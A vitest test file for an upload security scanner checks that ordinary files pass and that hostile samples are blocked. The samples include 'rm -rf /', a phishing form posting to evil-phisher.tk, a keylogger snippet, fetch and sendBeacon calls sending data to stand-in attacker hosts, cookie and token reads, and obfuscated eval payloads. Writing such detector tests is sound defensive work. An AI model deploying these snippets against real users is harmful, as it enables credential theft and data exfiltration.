/**
 * fileScanner.test.ts — vitest tests for the upload security scanner.
 */
import { describe, it, expect } from "vitest";
import { scanUploadedFile, assertFileSafe } from "./fileScanner";
import { TRPCError } from "@trpc/server";

// ─── Helpers ──────────────────────────────────────────────────────────────────

function buf(text: string, encoding: BufferEncoding = "utf8"): Buffer {
  return Buffer.from(text, encoding);
}

function imgBuf(extraContent = ""): Buffer {
  // Minimal valid PNG header (8 bytes) + optional extra content
  const header = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
  return Buffer.concat([header, buf(extraContent)]);
}

// ─── Safe files ───────────────────────────────────────────────────────────────

describe("Safe files — should pass", () => {
  it("accepts a plain text file", async () => {
    const result = await scanUploadedFile({
      buffer: buf("Hello, this is a normal document about mathematics."),
      mimeType: "text/plain",
      fileName: "notes.txt",
    });
    expect(result.safe).toBe(true);
  });

  it("accepts a PDF MIME type with safe content", async () => {
    const result = await scanUploadedFile({
      buffer: buf("%PDF-1.4 This is a normal PDF document about LOMLOE curriculum."),
      mimeType: "application/pdf",
      fileName: "curriculum.pdf",
    });
    expect(result.safe).toBe(true);
  });

  it("accepts a DOCX file", async () => {
    // ZIP magic bytes + docx extension
    const zipHeader = Buffer.from([0x50, 0x4b, 0x03, 0x04]);
    const rest = buf(" safe content here");
    const result = await scanUploadedFile({
      buffer: Buffer.concat([zipHeader, rest]),
      mimeType: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
      fileName: "lesson-plan.docx",
    });
    expect(result.safe).toBe(true);
  });

  it("accepts a JPEG image", async () => {
    const jpegHeader = Buffer.from([0xff, 0xd8, 0xff, 0xe0]);
    const result = await scanUploadedFile({
      buffer: Buffer.concat([jpegHeader, buf("image data")]),
      mimeType: "image/jpeg",
      fileName: "photo.jpg",
    });
    expect(result.safe).toBe(true);
  });

  it("accepts a WebM audio file", async () => {
    const result = await scanUploadedFile({
      buffer: buf("fake webm audio content"),
      mimeType: "audio/webm",
      fileName: "recording.webm",
    });
    expect(result.safe).toBe(true);
  });

  it("accepts HTML with internal links only", async () => {
    const result = await scanUploadedFile({
      buffer: buf('<html><body><a href="/about">About</a></body></html>'),
      mimeType: "text/html",
      fileName: "page.html",
    });
    expect(result.safe).toBe(true);
  });
});

// ─── Blocked MIME types ───────────────────────────────────────────────────────

describe("Blocked MIME types", () => {
  it("blocks application/javascript", async () => {
    const result = await scanUploadedFile({
      buffer: buf("alert('xss')"),
      mimeType: "application/javascript",
      fileName: "script.js",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("DANGEROUS_MIME");
  });

  it("blocks text/javascript", async () => {
    const result = await scanUploadedFile({
      buffer: buf("alert('xss')"),
      mimeType: "text/javascript",
      fileName: "script.js",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("DANGEROUS_MIME");
  });

  it("blocks application/x-sh", async () => {
    const result = await scanUploadedFile({
      buffer: buf("#!/bin/bash\nrm -rf /"),
      mimeType: "application/x-sh",
      fileName: "script.sh",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("DANGEROUS_MIME");
  });

  it("blocks application/x-httpd-php", async () => {
    const result = await scanUploadedFile({
      buffer: buf("<?php echo 'hello'; ?>"),
      mimeType: "application/x-httpd-php",
      fileName: "page.php",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("DANGEROUS_MIME");
  });
});

// ─── Blocked extensions ───────────────────────────────────────────────────────

describe("Blocked file extensions", () => {
  it("blocks .exe files", async () => {
    const result = await scanUploadedFile({
      buffer: buf("fake exe"),
      mimeType: "application/octet-stream",
      fileName: "malware.exe",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("DANGEROUS_EXTENSION");
  });

  it("blocks .bat files", async () => {
    const result = await scanUploadedFile({
      buffer: buf("@echo off"),
      mimeType: "application/octet-stream",
      fileName: "run.bat",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("DANGEROUS_EXTENSION");
  });

  it("blocks .ps1 files", async () => {
    const result = await scanUploadedFile({
      buffer: buf("Get-Process"),
      mimeType: "application/octet-stream",
      fileName: "script.ps1",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("DANGEROUS_EXTENSION");
  });

  it("blocks .php files", async () => {
    const result = await scanUploadedFile({
      buffer: buf("<?php echo 'hello'; ?>"),
      mimeType: "text/plain",
      fileName: "shell.php",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("DANGEROUS_EXTENSION");
  });
});

// ─── Magic bytes ──────────────────────────────────────────────────────────────

describe("Malicious magic bytes", () => {
  it("blocks Windows PE/EXE (MZ header)", async () => {
    const mzHeader = Buffer.from([0x4d, 0x5a, 0x90, 0x00]);
    const result = await scanUploadedFile({
      buffer: Buffer.concat([mzHeader, buf("fake exe content")]),
      mimeType: "application/octet-stream",
      fileName: "notavirus.pdf",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("MALICIOUS_MAGIC_BYTES");
  });

  it("blocks ELF executables", async () => {
    const elfHeader = Buffer.from([0x7f, 0x45, 0x4c, 0x46]);
    const result = await scanUploadedFile({
      buffer: Buffer.concat([elfHeader, buf("elf content")]),
      mimeType: "application/octet-stream",
      fileName: "binary",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("MALICIOUS_MAGIC_BYTES");
  });

  it("blocks OLE2 compound documents (legacy Office with macros)", async () => {
    const oleHeader = Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]);
    const result = await scanUploadedFile({
      buffer: Buffer.concat([oleHeader, buf("ole content")]),
      mimeType: "application/msword",
      fileName: "document.doc",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("MALICIOUS_MAGIC_BYTES");
  });
});

// ─── Macro documents ──────────────────────────────────────────────────────────

describe("Macro-enabled documents", () => {
  it("blocks .xlsm files", async () => {
    const result = await scanUploadedFile({
      buffer: buf("fake xlsm"),
      mimeType: "application/octet-stream",
      fileName: "data.xlsm",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("MACRO_DOCUMENT");
  });

  it("blocks .docm files", async () => {
    const result = await scanUploadedFile({
      buffer: buf("fake docm"),
      mimeType: "application/octet-stream",
      fileName: "report.docm",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("MACRO_DOCUMENT");
  });

  it("blocks macro MIME type", async () => {
    const result = await scanUploadedFile({
      buffer: buf("fake macro"),
      mimeType: "application/vnd.ms-excel.sheet.macroEnabled.12",
      fileName: "data.xlsx",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("MACRO_DOCUMENT");
  });
});

// ─── Credential harvesting ────────────────────────────────────────────────────

describe("Credential harvesting patterns", () => {
  it("blocks HTML form posting to external domain", async () => {
    const content = `<html><body>
      <form action="https://evil-phisher.tk/steal" method="POST">
        <input type="text" name="username">
        <input type="submit" value="Login">
      </form>
    </body></html>`;
    const result = await scanUploadedFile({
      buffer: buf(content),
      mimeType: "text/html",
      fileName: "form.html",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("CREDENTIAL_HARVESTING");
  });

  it("blocks password input fields in documents", async () => {
    const content = `<form><input type="password" name="pwd"></form>`;
    const result = await scanUploadedFile({
      buffer: buf(content),
      mimeType: "text/html",
      fileName: "login.html",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("CREDENTIAL_HARVESTING");
  });

  it("blocks keylogger patterns", async () => {
    const content = `document.addEventListener('keypress', function(e) { sendToServer(e.key); });`;
    const result = await scanUploadedFile({
      buffer: buf(content),
      mimeType: "text/plain",
      fileName: "notes.txt",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("CREDENTIAL_HARVESTING");
  });
});

// ─── Data exfiltration ────────────────────────────────────────────────────────

describe("Data exfiltration patterns", () => {
  it("blocks fetch to external domain", async () => {
    const content = `fetch("https://attacker.com/collect", { method: "POST", body: JSON.stringify(data) })`;
    const result = await scanUploadedFile({
      buffer: buf(content),
      mimeType: "text/plain",
      fileName: "script.txt",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("DATA_EXFILTRATION");
  });

  it("blocks navigator.sendBeacon", async () => {
    const content = `navigator.sendBeacon("https://tracker.com/log", payload)`;
    const result = await scanUploadedFile({
      buffer: buf(content),
      mimeType: "text/plain",
      fileName: "notes.txt",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("DATA_EXFILTRATION");
  });

  it("blocks document.cookie access", async () => {
    const content = `var cookies = document.cookie; sendToServer(cookies);`;
    const result = await scanUploadedFile({
      buffer: buf(content),
      mimeType: "text/plain",
      fileName: "notes.txt",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("DATA_EXFILTRATION");
  });

  it("blocks localStorage access", async () => {
    const content = `var token = localStorage.getItem("auth_token");`;
    const result = await scanUploadedFile({
      buffer: buf(content),
      mimeType: "text/plain",
      fileName: "notes.txt",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("DATA_EXFILTRATION");
  });
});

// ─── Script injection ─────────────────────────────────────────────────────────

describe("Script injection patterns", () => {
  it("blocks external script tags", async () => {
    const content = `<html><head><script src="https://evil.com/payload.js"></script></head></html>`;
    const result = await scanUploadedFile({
      buffer: buf(content),
      mimeType: "text/html",
      fileName: "page.html",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("SCRIPT_INJECTION");
  });

  it("blocks obfuscated eval", async () => {
    const content = `eval(atob("YWxlcnQoJ3hzcycpOw=="))`;
    const result = await scanUploadedFile({
      buffer: buf(content),
      mimeType: "text/plain",
      fileName: "notes.txt",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("OBFUSCATED_CODE");
  });

  it("blocks polyglot image with embedded script", async () => {
    const result = await scanUploadedFile({
      buffer: imgBuf('<script>alert("xss")</script>'),
      mimeType: "image/png",
      fileName: "image.png",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("SCRIPT_INJECTION");
  });
});

// ─── Phishing URLs ────────────────────────────────────────────────────────────

describe("Phishing URL patterns", () => {
  it("blocks documents containing phishing domain patterns", async () => {
    const content = `Please verify your account at https://paypal-login.tk/verify to avoid suspension.`;
    const result = await scanUploadedFile({
      buffer: buf(content),
      mimeType: "text/plain",
      fileName: "notice.txt",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("PHISHING_URL");
  });

  it("blocks IP-based login URLs", async () => {
    const content = `Click here to login: http://192.168.1.1/login?redirect=bank`;
    const result = await scanUploadedFile({
      buffer: buf(content),
      mimeType: "text/plain",
      fileName: "notice.txt",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("PHISHING_URL");
  });
});

// ─── Iframe injection ─────────────────────────────────────────────────────────

describe("Malicious iframe patterns", () => {
  it("blocks external iframes", async () => {
    const content = `<html><body><iframe src="https://phisher.com/steal"></iframe></body></html>`;
    const result = await scanUploadedFile({
      buffer: buf(content),
      mimeType: "text/html",
      fileName: "page.html",
    });
    expect(result.safe).toBe(false);
    expect(result.threatType).toBe("MALICIOUS_IFRAME");
  });
});

// ─── assertFileSafe wrapper ───────────────────────────────────────────────────

describe("assertFileSafe wrapper", () => {
  it("does not throw for safe files", async () => {
    await expect(
      assertFileSafe({
        buffer: buf("Safe document content about mathematics"),
        mimeType: "text/plain",
        fileName: "safe.txt",
      })
    ).resolves.toBeUndefined();
  });

  it("throws TRPCError for dangerous files", async () => {
    await expect(
      assertFileSafe({
        buffer: buf("eval(atob('YWxlcnQoMSk='))"),
        mimeType: "text/plain",
        fileName: "malicious.txt",
      })
    ).rejects.toThrow(TRPCError);
  });

  it("throws with BAD_REQUEST code", async () => {
    try {
      await assertFileSafe({
        buffer: buf("navigator.sendBeacon('https://evil.com', data)"),
        mimeType: "text/plain",
        fileName: "bad.txt",
      });
      expect.fail("Should have thrown");
    } catch (err) {
      expect(err).toBeInstanceOf(TRPCError);
      expect((err as TRPCError).code).toBe("BAD_REQUEST");
      expect((err as TRPCError).message).toContain("Upload blocked:");
    }
  });
});
